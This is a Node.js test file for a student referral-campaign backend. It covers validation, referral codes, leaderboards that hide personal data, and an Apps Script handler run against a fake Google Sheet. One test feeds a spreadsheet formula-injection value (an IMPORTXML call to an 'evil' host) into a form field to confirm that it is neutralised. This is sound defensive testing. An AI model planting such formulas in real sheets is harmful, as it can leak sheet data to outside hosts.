// Run: node --test tests/
// Tests ReferralCore (core.js) and the Apps Script backend (Code.gs) against a fake Google Sheet.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

const Core = require('../core.js');

const base = { name: 'Priya Sharma', email: 'priya@cbit.ac.in', phone: '9876543210', college: 'CBIT Hyderabad', branch: 'CSE', gradYear: '2027' };
function reg(rows, over, opts) {
  const r = Core.register(rows, Object.assign({}, base, over), opts);
  if (r.ok && !r.existing) rows.push(r.row);
  return r;
}

test('validates required fields and Indian mobile numbers', () => {
  const v = Core.validate({ name: 'A', email: 'nope', phone: '12345', college: '', branch: '', gradYear: '' });
  assert.equal(v.ok, false);
  assert.deepEqual(Object.keys(v.errors).sort(), ['branch', 'college', 'email', 'gradYear', 'name', 'phone']);
  assert.equal(Core.validate(base).ok, true);
  assert.equal(Core.normPhone('+91 98765-43210'), '9876543210');
  assert.equal(Core.normPhone('098765 43210'), '9876543210');
});

test('new registration gets a readable unique code', () => {
  const rows = [];
  const r = reg(rows);
  assert.equal(r.ok, true);
  assert.equal(r.existing, false);
  assert.match(r.row.code, /^PRIYA[A-HJ-KM-NP-Z2-9]{3}$/);
});

test('same email + phone returns the existing registration instead of duplicating', () => {
  const rows = [];
  const first = reg(rows);
  const again = reg(rows, { email: 'PRIYA@cbit.ac.in ', phone: '+91 98765 43210' });
  assert.equal(again.existing, true);
  assert.equal(again.row.code, first.row.code);
  assert.equal(rows.length, 1);
});

test('email or phone reused with a different partner is rejected', () => {
  const rows = [];
  reg(rows);
  assert.ok(reg(rows, { phone: '9000000001' }).errors.email);
  assert.ok(reg(rows, { email: 'other@x.com' }).errors.phone);
});

test('referral credit: valid code counts, self-referral and junk codes do not', () => {
  const rows = [];
  const priya = reg(rows).row;
  const friend = reg(rows, { name: 'Rahul Rao', email: 'rahul@x.com', phone: '9000000002', ref: priya.code.toLowerCase() }).row;
  assert.equal(friend.referredBy, priya.code);
  const junk = reg(rows, { name: 'Sneha Iyer', email: 'sneha@x.com', phone: '9000000003', ref: 'NOTACODE' }).row;
  assert.equal(junk.referredBy, '');
  assert.equal(Core.me(rows, priya.code).referrals, 1);
  assert.equal(Core.me(rows, priya.code).rank, 1);
});

test('leaderboard ranks by referrals, hides surnames, emails and phones', () => {
  const rows = [];
  const a = reg(rows, { name: 'Anil Kumar', email: 'a@x.com', phone: '9000000010' }).row;
  const b = reg(rows, { name: 'Bina Das', email: 'b@x.com', phone: '9000000011' }).row;
  for (let i = 0; i < 3; i++) reg(rows, { name: 'F' + i + ' X', email: 'f' + i + '@x.com', phone: '90000001' + (20 + i), ref: b.code });
  reg(rows, { name: 'G Y', email: 'g@x.com', phone: '9000000130', ref: a.code });
  const s = Core.publicStats(rows);
  assert.equal(s.topReferrers[0].name, 'Bina D.');
  assert.equal(s.topReferrers[0].count, 3);
  assert.equal(s.topReferrers[1].count, 1);
  const json = JSON.stringify(s);
  assert.ok(!json.includes('@x.com'));
  assert.ok(!json.includes('9000000'));
});

test('college leaderboard merges spelling variants', () => {
  const rows = [];
  reg(rows, { college: 'SRM KTR' });
  reg(rows, { name: 'Ravi K', email: 'r@x.com', phone: '9000000200', college: 'srm-ktr ' });
  assert.equal(Core.publicStats(rows).topColleges[0].count, 2);
});

test('lookup needs both email and phone', () => {
  const rows = [];
  const p = reg(rows).row;
  assert.equal(Core.lookup(rows, base.email, base.phone).code, p.code);
  assert.equal(Core.lookup(rows, base.email, '9111111111').found, false);
});

test('adminStats buckets by IST campaign day and splits organic vs referral', () => {
  const rows = [];
  const day1 = '2026-11-01T04:00:00.000Z'; // 9:30 AM IST, day 1
  const day2late = '2026-11-02T18:00:00.000Z'; // 11:30 PM IST, still day 2
  const p = reg(rows, {}, { now: day1 }).row;
  reg(rows, { name: 'Ravi K', email: 'r@x.com', phone: '9000000300', ref: p.code }, { now: day2late });
  reg(rows, { name: 'Old T', email: 't@x.com', phone: '9000000301', gradYear: '2028' }, { now: '2026-10-28T10:00:00Z' }); // pre-launch test
  const s = Core.adminStats(rows, { campaignStart: '2026-11-01', days: 7, finalYear: '2027', now: '2026-11-03T06:00:00Z',
    rewards: [{ at: 1, title: 'Starter' }] });
  assert.equal(s.daily[0].date, '2026-11-01');
  assert.equal(s.daily[0].organic, 2); // day-1 + pre-launch
  assert.equal(s.daily[1].referral, 1);
  assert.equal(s.daily[6].cumulative, 3);
  assert.equal(s.currentDay, 2);
  assert.equal(s.referralShare, 1 / 3);
  assert.equal(Math.round(s.finalYearShare * 100), 67);
  assert.equal(s.topReferrers[0].tier, 'Starter');
  assert.equal(s.channels.find(c => c.channel === 'referral').count, 1);
});

// ---------- Apps Script backend with a fake SpreadsheetApp ----------

function loadAppsScript() {
  const sheetRows = [];
  const fakeSheet = {
    appendRow: (r) => sheetRows.push(r.slice()),
    setFrozenRows: () => {},
    getRange: () => ({ setNumberFormat: () => {} }),
    getDataRange: () => ({ getValues: () => sheetRows.map(r => r.slice()) })
  };
  let created = false;
  const cache = {};
  const ctx = {
    SpreadsheetApp: { getActiveSpreadsheet: () => ({
      getSheetByName: () => (created ? fakeSheet : null),
      insertSheet: () => { created = true; return fakeSheet; },
      getUrl: () => 'https://sheet'
    }) },
    PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => (k === 'ADMIN_KEY' ? 'secret1' : null), setProperty: () => {} }) },
    LockService: { getScriptLock: () => ({ waitLock: () => {}, releaseLock: () => {} }) },
    CacheService: { getScriptCache: () => ({ get: k => cache[k] || null, put: (k, v) => { cache[k] = v; }, remove: k => { delete cache[k]; } }) },
    ContentService: { MimeType: { JSON: 'json' }, createTextOutput: (s) => ({ setMimeType: () => ({ body: JSON.parse(s) }) }) },
    Utilities: { getUuid: () => 'abcdefgh-1234' },
    Logger: { log: () => {} },
    console
  };
  vm.createContext(ctx);
  vm.runInContext(fs.readFileSync(path.join(__dirname, '..', 'core.js'), 'utf8'), ctx);
  vm.runInContext(fs.readFileSync(path.join(__dirname, '..', 'apps-script', 'Code.gs'), 'utf8'), ctx);
  const post = (body) => ctx.doPost({ postData: { contents: JSON.stringify(body) }, parameter: {} }).body;
  const get = (params) => ctx.doGet({ parameter: params }).body;
  return { post, get, sheetRows };
}

test('Apps Script: register → me → stats → admin round trip', () => {
  const { post, get, sheetRows } = loadAppsScript();
  const a = post(Object.assign({ action: 'register' }, base));
  assert.equal(a.ok, true);
  assert.equal(a.found, true);
  assert.equal(a.existing, false);
  assert.equal(sheetRows.length, 2); // header + row

  const b = post({ action: 'register', name: 'Rahul Rao', email: 'rahul@x.com', phone: '9000000002', college: 'CBIT', branch: 'IT', gradYear: '2027', ref: a.code, utm_source: 'WhatsApp' });
  assert.equal(b.ok, true);
  assert.equal(get({ action: 'me', code: a.code }).referrals, 1);
  assert.equal(get({ action: 'stats' }).total, 2);

  const again = post(Object.assign({ action: 'register' }, base));
  assert.equal(again.existing, true);
  assert.equal(sheetRows.length, 3);

  assert.equal(post({ action: 'admin', key: 'wrong' }).ok, false);
  const admin = post({ action: 'admin', key: 'secret1' });
  assert.equal(admin.rows.length, 2);
  assert.equal(admin.rows[1].source, 'whatsapp');
  assert.equal(admin.rows[1].referredBy, a.code);
});

test('Apps Script: honeypot stores nothing, formula injection is neutralised', () => {
  const { post, sheetRows } = loadAppsScript();
  post(Object.assign({ action: 'register', website: 'spam.com' }, base));
  assert.equal(sheetRows.length, 0);
  post(Object.assign({ action: 'register' }, base, { college: '=IMPORTXML("http://evil","//a")' }));
  assert.equal(sheetRows[1][4].charAt(0), "'");
});

test('Apps Script: stats cache is invalidated by a new registration', () => {
  const { post, get } = loadAppsScript();
  post(Object.assign({ action: 'register' }, base));
  assert.equal(get({ action: 'stats' }).total, 1);
  post({ action: 'register', name: 'Ravi K', email: 'r@x.com', phone: '9000000400', college: 'XYZ College', branch: 'IT', gradYear: '2027' });
  assert.equal(get({ action: 'stats' }).total, 2);
});
